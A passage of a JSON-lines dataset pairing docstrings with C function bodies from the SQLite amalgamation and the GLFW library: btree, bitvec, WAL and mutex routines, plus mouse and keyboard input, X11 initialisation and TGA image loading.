 testcase( nSize==pPage->maxLocal );\n  testcase( nSize==pPage->maxLocal+1 );\n  if( nSize<=pPage->maxLocal ){\n    nSize += (u32)(pIter - pCell);\n    if( nSize<4 ) nSize = 4;\n  }else{\n    int minLocal = pPage->minLocal;\n    nSize = minLocal + (nSize - minLocal) % (pPage->pBt->usableSize - 4);\n    testcase( nSize==pPage->maxLocal );\n    testcase( nSize==pPage->maxLocal+1 );\n    if( nSize>pPage->maxLocal ){\n      nSize = minLocal;\n    }\n    nSize += 4 + (u16)(pIter - pCell);\n  }\n  assert( nSize==debuginfo.nSize || CORRUPT_DB );\n  return (u16)nSize;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/* This routine is just a convenient place to set a breakpoint that will\n** fire after each opcode is inserted and displayed using\n** \"PRAGMA vdbe_addoptrace=on\".\n*/\n", "func_signal": "static void test_addop_breakpoint(void)", "code": "{\n  static int n = 0;\n  n++;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** This function is used to add VdbeComment() annotations to a VDBE\n** program. It is not used in production code, only for debugging.\n*/\n", "func_signal": "static const char *onErrorText(int onError)", "code": "{\n  switch( onError ){\n    case OE_Abort:    return \"abort\";\n    case OE_Rollback: return \"rollback\";\n    case OE_Fail:     return \"fail\";\n    case OE_Replace:  return \"replace\";\n    case OE_Ignore:   return \"ignore\";\n    case OE_Default:  return \"default\";\n  }\n  return \"n/a\";\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Return non-zero if a read (or write) transaction is active.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeIsInReadTrans(Btree *p)", "code": "{\n  assert( p );\n  assert( sqlite3_mutex_held(p->db->mutex) );\n  return p->inTrans!=TRANS_NONE;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Set the i-th bit.  Return 0 on success and an error code if\n** anything goes wrong.\n**\n** This routine might cause sub-bitmaps to be allocated.  Failing\n** to get the memory needed to hold the sub-bitmap is the only\n** that can go wrong with an insert, assuming p and i are valid.\n**\n** The calling function must ensure that p is a valid Bitvec object\n** and that the value for \"i\" is within range of the Bitvec object.\n** Otherwise the behavior is undefined.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BitvecSet(Bitvec *p, u32 i)", "code": "{\n  u32 h;\n  if( p==0 ) return SQLITE_OK;\n  assert( i>0 );\n  assert( i<=p->iSize );\n  i--;\n  while((p->iSize > BITVEC_NBIT) && p->iDivisor) {\n    u32 bin = i/p->iDivisor;\n    i = i%p->iDivisor;\n    if( p->u.apSub[bin]==0 ){\n      p->u.apSub[bin] = sqlite3BitvecCreate( p->iDivisor );\n      if( p->u.apSub[bin]==0 ) return SQLITE_NOMEM_BKPT;\n    }\n    p = p->u.apSub[bin];\n  }\n  if( p->iSize<=BITVEC_NBIT ){\n    p->u.aBitmap[i/BITVEC_SZELEM] |= 1 << (i&(BITVEC_SZELEM-1));\n    return SQLITE_OK;\n  }\n  h = BITVEC_HASH(i++);\n  /* if there wasn't a hash collision, and this doesn't */\n  /* completely fill the hash, then just add it without */\n  /* worring about sub-dividing and re-hashing. */\n  if( !p->u.aHash[h] ){\n    if (p->nSet<(BITVEC_NINT-1)) {\n      goto bitvec_set_end;\n    } else {\n      goto bitvec_set_rehash;\n    }\n  }\n  /* there was a collision, check to see if it's already */\n  /* in hash, if not, try to find a spot for it */\n  do {\n    if( p->u.aHash[h]==i ) return SQLITE_OK;\n    h++;\n    if( h>=BITVEC_NINT ) h = 0;\n  } while( p->u.aHash[h] );\n  /* we didn't find it in the hash.  h points to the first */\n  /* available free spot. check to see if this is going to */\n  /* make our hash too \"full\".  */\nbitvec_set_rehash:\n  if( p->nSet>=BITVEC_MXHASH ){\n    unsigned int j;\n    int rc;\n    u32 *aiValues = sqlite3StackAllocRaw(0, sizeof(p->u.aHash));\n    if( aiValues==0 ){\n      return SQLITE_NOMEM_BKPT;\n    }else{\n      memcpy(aiValues, p->u.aHash, sizeof(p->u.aHash));\n      memset(p->u.apSub, 0, sizeof(p->u.apSub));\n      p->iDivisor = (p->iSize + BITVEC_NPTR - 1)/BITVEC_NPTR;\n      rc = sqlite3BitvecSet(p, i);\n      for(j=0; j<BITVEC_NINT; j++){\n        if( aiValues[j] ) rc |= sqlite3BitvecSet(p, aiValues[j]);\n      }\n      sqlite3StackFree(0, aiValues);\n      return rc;\n    }\n  }\nbitvec_set_end:\n  p->nSet++;\n  p->u.aHash[h] = i;\n  return SQLITE_OK;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Do a comparison between a 64-bit signed integer and a 64-bit floating-point\n** number.  Return negative, zero, or positive if the first (i64) is less than,\n** equal to, or greater than the second (double).\n*/\n", "func_signal": "static int sqlite3IntFloatCompare(i64 i, double r)", "code": "{\n  if( sizeof(LONGDOUBLE_TYPE)>8 ){\n    LONGDOUBLE_TYPE x = (LONGDOUBLE_TYPE)i;\n    if( x<r ) return -1;\n    if( x>r ) return +1;\n    return 0;\n  }else{\n    i64 y;\n    double s;\n    if( r<-9223372036854775808.0 ) return +1;\n    if( r>9223372036854775807.0 ) return -1;\n    y = (i64)r;\n    if( i<y ) return -1;\n    if( i>y ){\n      if( y==SMALLEST_INT64 && r>0.0 ) return -1;\n      return +1;\n    }\n    s = (double)i;\n    if( s<r ) return -1;\n    if( s>r ) return +1;\n    return 0;\n  }\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/* \n ** Creates the lock file and any missing directories in lockPath\n */\n", "func_signal": "static int proxyCreateLockPath(const char *lockPath)", "code": "{\n  int i, len;\n  char buf[MAXPATHLEN];\n  int start = 0;\n  \n  assert(lockPath!=NULL);\n  /* try to create all the intermediate directories */\n  len = (int)strlen(lockPath);\n  buf[0] = lockPath[0];\n  for( i=1; i<len; i++ ){\n    if( lockPath[i] == '/' && (i - start > 0) ){\n      /* only mkdir if leaf dir != \".\" or \"/\" or \"..\" */\n      if( i-start>2 || (i-start==1 && buf[start] != '.' && buf[start] != '/') \n         || (i-start==2 && buf[start] != '.' && buf[start+1] != '.') ){\n        buf[i]='\\0';\n        if( osMkdir(buf, SQLITE_DEFAULT_PROXYDIR_PERMISSIONS) ){\n          int err=errno;\n          if( err!=EEXIST ) {\n            OSTRACE((\"CREATELOCKPATH  FAILED creating %s, \"\n                     \"'%s' proxy lock path=%s pid=%d\\n\",\n                     buf, strerror(err), lockPath, osGetpid(0)));\n            return err;\n          }\n        }\n      }\n      start=i+1;\n    }\n    buf[i] = lockPath[i];\n  }\n  OSTRACE((\"CREATELOCKPATH  proxy lock path=%s pid=%d\\n\",lockPath,osGetpid(0)));\n  return 0;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Return true if the BtShared mutex is held on the btree, or if the\n** B-Tree is not marked as sharable.\n**\n** This routine is used only from within assert() statements.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeHoldsMutex(Btree *p)", "code": "{\n  assert( p->sharable==0 || p->locked==0 || p->wantToLock>0 );\n  assert( p->sharable==0 || p->locked==0 || p->db==p->pBt->db );\n  assert( p->sharable==0 || p->locked==0 || sqlite3_mutex_held(p->pBt->mutex) );\n  assert( p->sharable==0 || p->locked==0 || sqlite3_mutex_held(p->db->mutex) );\n\n  return (p->sharable==0 || p->locked);\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Convert a multi-byte character string to UTF-8.\n**\n** Space to hold the returned string is obtained from sqlite3_malloc().\n*/\n", "func_signal": "static char *winMbcsToUtf8(const char *zText, int useAnsi)", "code": "{\n  char *zTextUtf8;\n  LPWSTR zTmpWide;\n\n  zTmpWide = winMbcsToUnicode(zText, useAnsi);\n  if( zTmpWide==0 ){\n    return 0;\n  }\n  zTextUtf8 = winUnicodeToUtf8(zTmpWide);\n  sqlite3_free(zTmpWide);\n  return zTextUtf8;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Finish with a read transaction.  All this does is release the\n** read-lock.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3WalEndReadTransaction(Wal *pWal)", "code": "{\n  sqlite3WalEndWriteTransaction(pWal);\n  if( pWal->readLock>=0 ){\n    walUnlockShared(pWal, WAL_READ_LOCK(pWal->readLock));\n    pWal->readLock = -1;\n  }\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Set an Fts3SegReader cursor to point at EOF.\n*/\n", "func_signal": "static void fts3SegReaderSetEof(Fts3SegReader *pSeg)", "code": "{\n  if( !fts3SegReaderIsRootOnly(pSeg) ){\n    sqlite3_free(pSeg->aNode);\n    sqlite3_blob_close(pSeg->pBlob);\n    pSeg->pBlob = 0;\n  }\n  pSeg->aNode = 0;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Return the name of the i-th column of the pIdx index.\n*/\n", "func_signal": "static const char *explainIndexColumnName(Index *pIdx, int i)", "code": "{\n  i = pIdx->aiColumn[i];\n  if( i==XN_EXPR ) return \"<expr>\";\n  if( i==XN_ROWID ) return \"rowid\";\n  return pIdx->pTable->aCol[i].zName;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Free a dynamic mutex.\n*/\n", "func_signal": "SQLITE_API void SQLITE_STDCALL sqlite3_mutex_free(sqlite3_mutex *p)", "code": "{\n  if( p ){\n    assert( sqlite3GlobalConfig.mutex.xMutexFree );\n    sqlite3GlobalConfig.mutex.xMutexFree(p);\n  }\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/* Move the cursor to the first entry in the table.  Return SQLITE_OK\n** on success.  Set *pRes to 0 if the cursor actually points to something\n** or set *pRes to 1 if the table is empty.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeFirst(BtCursor *pCur, int *pRes)", "code": "{\n  int rc;\n\n  assert( cursorOwnsBtShared(pCur) );\n  assert( sqlite3_mutex_held(pCur->pBtree->db->mutex) );\n  rc = moveToRoot(pCur);\n  if( rc==SQLITE_OK ){\n    if( pCur->eState==CURSOR_INVALID ){\n      assert( pCur->pgnoRoot==0 || pCur->apPage[pCur->iPage]->nCell==0 );\n      *pRes = 1;\n    }else{\n      assert( pCur->apPage[pCur->iPage]->nCell>0 );\n      *pRes = 0;\n      rc = moveToLeftmost(pCur);\n    }\n  }\n  return rc;\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** If parameter iOp is less than zero, then invoke the destructor for\n** all auxiliary data pointers currently cached by the VM passed as\n** the first argument.\n**\n** Or, if iOp is greater than or equal to zero, then the destructor is\n** only invoked for those auxiliary data pointers created by the user \n** function invoked by the OP_Function opcode at instruction iOp of \n** VM pVdbe, and only then if:\n**\n**    * the associated function parameter is the 32nd or later (counting\n**      from left to right), or\n**\n**    * the corresponding bit in argument mask is clear (where the first\n**      function parameter corresponds to bit 0 etc.).\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VdbeDeleteAuxData(sqlite3 *db, AuxData **pp, int iOp, int mask)", "code": "{\n  while( *pp ){\n    AuxData *pAux = *pp;\n    if( (iOp<0)\n     || (pAux->iOp==iOp && (pAux->iArg>31 || !(mask & MASKBIT32(pAux->iArg))))\n    ){\n      testcase( pAux->iArg==31 );\n      if( pAux->xDelete ){\n        pAux->xDelete(pAux->pAux);\n      }\n      *pp = pAux->pNext;\n      sqlite3DbFree(db, pAux);\n    }else{\n      pp= &pAux->pNext;\n    }\n  }\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "/*\n** Add an error message to pParse->zErrMsg and increment pParse->nErr.\n** The following formatting characters are allowed:\n**\n**      %s      Insert a string\n**      %z      A string that should be freed after use\n**      %d      Insert an integer\n**      %T      Insert a token\n**      %S      Insert the first element of a SrcList\n**\n** This function should be used to report any error that occurs while\n** compiling an SQL statement (i.e. within sqlite3_prepare()). The\n** last thing the sqlite3_prepare() function does is copy the error\n** stored by this function into the database handle using sqlite3Error().\n** Functions sqlite3Error() or sqlite3ErrorWithMsg() should be used\n** during statement execution (sqlite3_step() etc.).\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3ErrorMsg(Parse *pParse, const char *zFormat, ...)", "code": "{\n  char *zMsg;\n  va_list ap;\n  sqlite3 *db = pParse->db;\n  va_start(ap, zFormat);\n  zMsg = sqlite3VMPrintf(db, zFormat, ap);\n  va_end(ap);\n  if( db->suppressErr ){\n    sqlite3DbFree(db, zMsg);\n  }else{\n    pParse->nErr++;\n    sqlite3DbFree(db, pParse->zErrMsg);\n    pParse->zErrMsg = zMsg;\n    pParse->rc = SQLITE_ERROR;\n  }\n}", "path": "sqlite3.c", "repo_name": "riolet/longs", "stars": 185, "license": "gpl-2.0", "language": "c", "size": 2013}
{"docstring": "//========================================================================\n// Return mouse cursor position\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwGetMousePos( int *xpos, int *ypos )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Return mouse position\n    if( xpos != NULL )\n    {\n        *xpos = _glfwInput.MousePosX;\n    }\n    if( ypos != NULL )\n    {\n        *ypos = _glfwInput.MousePosY;\n    }\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Set callback function for mouse wheel\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetMouseWheelCallback( GLFWmousewheelfun cbfun )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set callback function\n    _glfwWin.mouseWheelCallback = cbfun;\n\n    // Call the callback function to let the application know the current\n    // mouse wheel position\n    if( cbfun )\n    {\n        cbfun( _glfwInput.WheelPos );\n    }\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Return key state\n//========================================================================\n", "func_signal": "GLFWAPI int GLFWAPIENTRY glfwGetKey( int key )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return GLFW_RELEASE;\n    }\n\n    // Is it a valid key?\n    if( key < 0 || key > GLFW_KEY_LAST )\n    {\n        return GLFW_RELEASE;\n    }\n\n    if( _glfwInput.Key[ key ] == GLFW_STICK )\n    {\n        // Sticky mode: release key now\n        _glfwInput.Key[ key ] = GLFW_RELEASE;\n        return GLFW_PRESS;\n    }\n\n    return (int) _glfwInput.Key[ key ];\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Set callback function for mouse moves\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetMousePosCallback( GLFWmouseposfun cbfun )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set callback function\n    _glfwWin.mousePosCallback = cbfun;\n\n    // Call the callback function to let the application know the current\n    // mouse position\n    if( cbfun )\n    {\n        cbfun( _glfwInput.MousePosX, _glfwInput.MousePosY );\n    }\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Terminate X11 display\n//========================================================================\n", "func_signal": "static void terminateDisplay( void )", "code": "{\n    // Open display\n    if( _glfwLibrary.display )\n    {\n        XCloseDisplay( _glfwLibrary.display );\n        _glfwLibrary.display = NULL;\n    }\n}", "path": "lib\\glfw\\lib\\x11\\x11_init.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Initialize GLFW thread package\n//========================================================================\n", "func_signal": "static void initThreads( void )", "code": "{\n    // Initialize critical section handle\n#ifdef _GLFW_HAS_PTHREAD\n    (void) pthread_mutex_init( &_glfwThrd.CriticalSection, NULL );\n#endif\n\n    // The first thread (the main thread) has ID 0\n    _glfwThrd.NextID = 0;\n\n    // Fill out information about the main thread (this thread)\n    _glfwThrd.First.ID       = _glfwThrd.NextID++;\n    _glfwThrd.First.Function = NULL;\n    _glfwThrd.First.Previous = NULL;\n    _glfwThrd.First.Next     = NULL;\n#ifdef _GLFW_HAS_PTHREAD\n    _glfwThrd.First.PosixID  = pthread_self();\n#endif\n}", "path": "lib\\glfw\\lib\\x11\\x11_init.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Read a TGA image from a file\n//========================================================================\n", "func_signal": "int _glfwReadTGA( _GLFWstream *s, GLFWimage *img, int flags )", "code": "{\n    _tga_header_t h;\n    unsigned char *cmap, *pix, tmp, *src, *dst;\n    int cmapsize, pixsize, pixsize2;\n    int bpp, bpp2, k, m, n, swapx, swapy;\n\n    // Read TGA header\n    if( !ReadTGAHeader( s, &h ) )\n    {\n        return 0;\n    }\n\n    // Is there a colormap?\n    cmapsize = (h.cmaptype == _TGA_CMAPTYPE_PRESENT ? 1 : 0) * h.cmaplen *\n               ((h.cmapentrysize+7) / 8);\n    if( cmapsize > 0 )\n    {\n        // Is it a colormap that we can handle?\n        if( (h.cmapentrysize != 24 && h.cmapentrysize != 32) ||\n            h.cmaplen == 0 || h.cmaplen > 256 )\n        {\n            return 0;\n        }\n\n        // Allocate memory for colormap\n        cmap = (unsigned char *) malloc( cmapsize );\n        if( cmap == NULL )\n        {\n            return 0;\n        }\n\n        // Read colormap from file\n        _glfwReadStream( s, cmap, cmapsize );\n    }\n    else\n    {\n        cmap = NULL;\n    }\n\n    // Size of pixel data\n    pixsize = h.width * h.height * ((h.bitsperpixel + 7) / 8);\n\n    // Bytes per pixel (pixel data - unexpanded)\n    bpp = (h.bitsperpixel + 7) / 8;\n\n    // Bytes per pixel (expanded pixels - not colormap indeces)\n    if( cmap )\n    {\n        bpp2 = (h.cmapentrysize + 7) / 8;\n    }\n    else\n    {\n        bpp2 = bpp;\n    }\n\n    // For colormaped images, the RGB/RGBA image data may use more memory\n    // than the stored pixel data\n    pixsize2 = h.width * h.height * bpp2;\n\n    // Allocate memory for pixel data\n    pix = (unsigned char *) malloc( pixsize2 );\n    if( pix == NULL )\n    {\n        if( cmap )\n        {\n            free( cmap );\n        }\n        return 0;\n    }\n\n    // Read pixel data from file\n    if( h.imagetype >= _TGA_IMAGETYPE_CMAP_RLE )\n    {\n        ReadTGA_RLE( pix, pixsize, bpp, s );\n    }\n    else\n    {\n        _glfwReadStream( s, pix, pixsize );\n    }\n\n    // If the image origin is not what we want, re-arrange the pixels\n    switch( h._origin )\n    {\n    default:\n    case _TGA_ORIGIN_UL:\n        swapx = 0;\n        swapy = 1;\n        break;\n\n    case _TGA_ORIGIN_BL:\n        swapx = 0;\n        swapy = 0;\n        break;\n\n    case _TGA_ORIGIN_UR:\n        swapx = 1;\n        swapy = 1;\n        break;\n\n    case _TGA_ORIGIN_BR:\n        swapx = 1;\n        swapy = 0;\n        break;\n    }\n    if( (swapy && !(flags & GLFW_ORIGIN_UL_BIT)) ||\n        (!swapy && (flags & GLFW_ORIGIN_UL_BIT)) )\n    {\n        src = pix;\n        dst = &pix[ (h.height-1)*h.width*bpp ];\n        for( n = 0; n < h.height/2; n ++ )\n        {\n            for( m = 0; m < h.width ; m ++ )\n            {\n                for( k = 0; k < bpp; k ++ )\n                {\n                    tmp     = *src;\n                    *src ++ = *dst;\n                    *dst ++ = tmp;\n                }\n            }\n            dst -= 2*h.width*bpp;\n        }\n    }\n    if( swapx )\n    {\n        src = pix;\n        dst = &pix[ (h.width-1)*bpp ];\n        for( n = 0; n < h.height; n ++ )\n        {\n            for( m = 0; m < h.width/2 ; m ++ )\n            {\n                for( k = 0; k < bpp; k ++ )\n                {\n                    tmp     = *src;\n                    *src ++ = *dst;\n                    *dst ++ = tmp;\n                }\n                dst -= 2*bpp;\n            }\n            src += ((h.width+1)/2)*bpp;\n            dst += ((3*h.width+1)/2)*bpp;\n        }\n    }\n\n    // Convert BGR/BGRA to RGB/RGBA, and optionally colormap indeces to\n    // RGB/RGBA values\n    if( cmap )\n    {\n        // Convert colormap pixel format (BGR -> RGB or BGRA -> RGBA)\n        if( bpp2 == 3 || bpp2 == 4 )\n        {\n            for( n = 0; n < h.cmaplen; n ++ )\n            {\n                tmp                = cmap[ n*bpp2 ];\n                cmap[ n*bpp2 ]     = cmap[ n*bpp2 + 2 ];\n                cmap[ n*bpp2 + 2 ] = tmp;\n            }\n        }\n\n        // Convert pixel data to RGB/RGBA data\n        for( m = h.width * h.height - 1; m >= 0; m -- )\n        {\n            n = pix[ m ];\n            for( k = 0; k < bpp2; k ++ )\n            {\n                pix[ m*bpp2 + k ] = cmap[ n*bpp2 + k ];\n            }\n        }\n\n        // Free memory for colormap (it's not needed anymore)\n        free( cmap );\n    }\n    else\n    {\n        // Convert image pixel format (BGR -> RGB or BGRA -> RGBA)\n        if( bpp2 == 3 || bpp2 == 4 )\n        {\n            src = pix;\n            dst = &pix[ 2 ];\n            for( n = 0; n < h.height * h.width; n ++ )\n            {\n                tmp  = *src;\n                *src = *dst;\n                *dst = tmp;\n                src += bpp2;\n                dst += bpp2;\n            }\n        }\n    }\n\n    // Fill out GLFWimage struct (the Format field will be set by\n    // glfwReadImage)\n    img->Width         = h.width;\n    img->Height        = h.height;\n    img->BytesPerPixel = bpp2;\n    img->Data          = pix;\n\n    return 1;\n}", "path": "lib\\glfw\\lib\\tga.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Set callback function for keyboard input\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetKeyCallback( GLFWkeyfun cbfun )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set callback function\n    _glfwWin.keyCallback = cbfun;\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Set callback function for mouse clicks\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetMouseButtonCallback( GLFWmousebuttonfun cbfun )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set callback function\n    _glfwWin.mouseButtonCallback = cbfun;\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Initialize various GLFW state\n//========================================================================\n", "func_signal": "int _glfwPlatformInit( void )", "code": "{\n    // Initialize display\n    if( !initDisplay() )\n    {\n        return GL_FALSE;\n    }\n\n    // Initialize thread package\n    initThreads();\n\n    // Try to load libGL.so if necessary\n    initLibraries();\n\n    _glfwPlatformGetDesktopMode( &_glfwLibrary.desktopMode );\n\n    // Install atexit() routine\n    atexit( glfw_atexit );\n\n    // Initialize joysticks\n    _glfwInitJoysticks();\n\n    // Start the timer\n    _glfwInitTimer();\n\n    return GL_TRUE;\n}", "path": "lib\\glfw\\lib\\x11\\x11_init.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Sets the mouse cursor position\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetMousePos( int xpos, int ypos )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Don't do anything if the mouse position did not change\n    if( xpos == _glfwInput.MousePosX && ypos == _glfwInput.MousePosY )\n    {\n        return;\n    }\n\n    // Set GLFW mouse position\n    _glfwInput.MousePosX = xpos;\n    _glfwInput.MousePosY = ypos;\n\n    // If we have a locked mouse, do not change cursor position\n    if( _glfwWin.mouseLock )\n    {\n        return;\n    }\n\n    // Update physical cursor position\n    _glfwPlatformSetMouseCursorPos( xpos, ypos );\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Terminate GLFW thread package\n//========================================================================\n", "func_signal": "static void terminateThreads( void )", "code": "{\n#ifdef _GLFW_HAS_PTHREAD\n\n    _GLFWthread *t, *t_next;\n\n    // Enter critical section\n    ENTER_THREAD_CRITICAL_SECTION\n\n    // Kill all threads (NOTE: THE USER SHOULD WAIT FOR ALL THREADS TO\n    // DIE, _BEFORE_ CALLING glfwTerminate()!!!)\n    t = _glfwThrd.First.Next;\n    while( t != NULL )\n    {\n        // Get pointer to next thread\n        t_next = t->Next;\n\n        // Simply murder the process, no mercy!\n        pthread_kill( t->PosixID, SIGKILL );\n\n        // Free memory allocated for this thread\n        free( (void *) t );\n\n        // Select next thread in list\n        t = t_next;\n    }\n\n    // Leave critical section\n    LEAVE_THREAD_CRITICAL_SECTION\n\n    // Delete critical section handle\n    pthread_mutex_destroy( &_glfwThrd.CriticalSection );\n\n#endif // _GLFW_HAS_PTHREAD\n}", "path": "lib\\glfw\\lib\\x11\\x11_init.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Dynamically load libraries\n//========================================================================\n", "func_signal": "static void initLibraries( void )", "code": "{\n#ifdef _GLFW_DLOPEN_LIBGL\n    int i;\n    char *libGL_names[ ] =\n    {\n        \"libGL.so\",\n        \"libGL.so.1\",\n        \"/usr/lib/libGL.so\",\n        \"/usr/lib/libGL.so.1\",\n        NULL\n    };\n\n    _glfwLibrary.Libs.libGL = NULL;\n    for( i = 0; !libGL_names[ i ] != NULL; i ++ )\n    {\n        _glfwLibrary.Libs.libGL = dlopen( libGL_names[ i ],\n                                          RTLD_LAZY | RTLD_GLOBAL );\n        if( _glfwLibrary.Libs.libGL )\n            break;\n    }\n#endif\n}", "path": "lib\\glfw\\lib\\x11\\x11_init.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Close window and kill all threads\n//========================================================================\n", "func_signal": "int _glfwPlatformTerminate( void )", "code": "{\n#ifdef _GLFW_HAS_PTHREAD\n    // Only the main thread is allowed to do this...\n    if( pthread_self() != _glfwThrd.First.PosixID )\n    {\n        return GL_FALSE;\n    }\n#endif // _GLFW_HAS_PTHREAD\n\n    // Close OpenGL window\n    glfwCloseWindow();\n\n    // Kill thread package\n    terminateThreads();\n\n    // Terminate display\n    terminateDisplay();\n\n    // Terminate joysticks\n    _glfwTerminateJoysticks();\n\n    // Unload libGL.so if necessary\n#ifdef _GLFW_DLOPEN_LIBGL\n    if( _glfwLibrary.Libs.libGL != NULL )\n    {\n        dlclose( _glfwLibrary.Libs.libGL );\n        _glfwLibrary.Libs.libGL = NULL;\n    }\n#endif\n\n    return GL_TRUE;\n}", "path": "lib\\glfw\\lib\\x11\\x11_init.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Initialize X11 display\n//========================================================================\n", "func_signal": "static int initDisplay( void )", "code": "{\n    // Open display\n    _glfwLibrary.display = XOpenDisplay( 0 );\n    if( !_glfwLibrary.display )\n    {\n        fprintf(stderr, \"Failed to open X display\\n\");\n        return GL_FALSE;\n    }\n\n    // Check for XF86VidMode extension\n#ifdef _GLFW_HAS_XF86VIDMODE\n    _glfwLibrary.XF86VidMode.available =\n        XF86VidModeQueryExtension( _glfwLibrary.display,\n                                   &_glfwLibrary.XF86VidMode.eventBase,\n                                   &_glfwLibrary.XF86VidMode.errorBase);\n#else\n    _glfwLibrary.XF86VidMode.available = 0;\n#endif\n\n    // Check for XRandR extension\n#ifdef _GLFW_HAS_XRANDR\n    _glfwLibrary.XRandR.available =\n        XRRQueryExtension( _glfwLibrary.display,\n                           &_glfwLibrary.XRandR.eventBase,\n                           &_glfwLibrary.XRandR.errorBase );\n#else\n    _glfwLibrary.XRandR.available = 0;\n#endif\n\n    // Fullscreen & screen saver settings\n    // Check if GLX is supported on this display\n    if( !glXQueryExtension( _glfwLibrary.display, NULL, NULL ) )\n    {\n        fprintf(stderr, \"GLX not supported\\n\");\n        return GL_FALSE;\n    }\n\n    // Retrieve GLX version\n    if( !glXQueryVersion( _glfwLibrary.display,\n                          &_glfwLibrary.glxMajor,\n                          &_glfwLibrary.glxMinor ) )\n    {\n        fprintf(stderr, \"Unable to query GLX version\\n\");\n        return GL_FALSE;\n    }\n\n    return 